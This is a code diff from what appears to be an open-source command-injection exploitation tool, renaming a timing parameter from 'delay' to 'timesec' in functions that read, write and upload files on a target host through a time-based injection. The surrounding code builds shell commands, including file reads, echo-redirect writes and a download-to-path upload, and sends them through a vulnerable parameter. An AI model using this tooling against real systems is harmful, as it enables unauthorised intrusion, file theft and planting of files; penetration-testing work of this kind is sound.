@@ -34,7 +34,7 @@ from src.core.injections.semiblind.techniques.file_based import fb_injector
 """
 Read a file from the target host.
 """
-def file_read(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
+def file_read(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
   file_to_read = menu.options.file_read
   # Execute command
   if settings.TARGET_OS == "win":
@@ -43,7 +43,7 @@ def file_read(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, ht
     cmd = settings.FILE_READ + file_to_read 
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
     # The main command injection exploitation.
-    check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
+    check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
     session_handler.store_cmd(url, cmd, output, vuln_parameter)
     new_line = "\n"
   else:
@@ -77,7 +77,7 @@ def file_read(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, ht
 """
 Write to a file on the target host.
 """
-def file_write(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
+def file_write(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
   file_to_write = menu.options.file_write
   if not os.path.exists(file_to_write):
     warn_msg = "It seems that the '" + file_to_write + "' file, does not exists."
@@ -142,14 +142,14 @@ def file_write(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, h
 
   else:
     cmd = settings.FILE_WRITE + "'" + content + "'" + ">" + "'" + dest_to_write + "'" + separator + settings.FILE_READ + dest_to_write
-    check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
+    check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
     shell = output 
     shell = "".join(str(p) for p in shell)
     # Check if file exists
     cmd = "echo $(ls " + dest_to_write + ")"
 
   print ""
-  check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
+  check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
   shell = output 
   try:
     shell = "".join(str(p) for p in shell)
@@ -170,7 +170,7 @@ def file_write(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, h
 """
 Upload a file on the target host.
 """
-def file_upload(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
+def file_upload(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
   if settings.TARGET_OS == "win":
     # Not yet implemented
     pass
@@ -195,7 +195,7 @@ def file_upload(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, 
       
     # Execute command
     cmd = settings.FILE_UPLOAD + file_to_upload + " -O " + dest_to_upload 
-    check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
+    check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
     shell = output 
     shell = "".join(str(p) for p in shell)
     
@@ -206,7 +206,7 @@ def file_upload(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, 
       cmd = "echo $(ls " + dest_to_upload + ")"
       
     print ""  
-    check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
+    check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
     shell = output 
     try:
       shell = "".join(str(p) for p in shell)
@@ -227,20 +227,20 @@ def file_upload(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, 
 """
 Check the defined options
 """
-def do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
+def do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
 
   if menu.options.file_read:  
-    file_read(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
+    file_read(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
     if settings.FILE_ACCESS_DONE == False:
       settings.FILE_ACCESS_DONE = True
 
   if menu.options.file_write:
-    file_write(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
+    file_write(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
     if settings.FILE_ACCESS_DONE == False:
       settings.FILE_ACCESS_DONE = True
 
   if menu.options.file_upload:
-    file_upload(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
+    file_upload(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
     if settings.FILE_ACCESS_DONE == False:
       settings.FILE_ACCESS_DONE = True
 
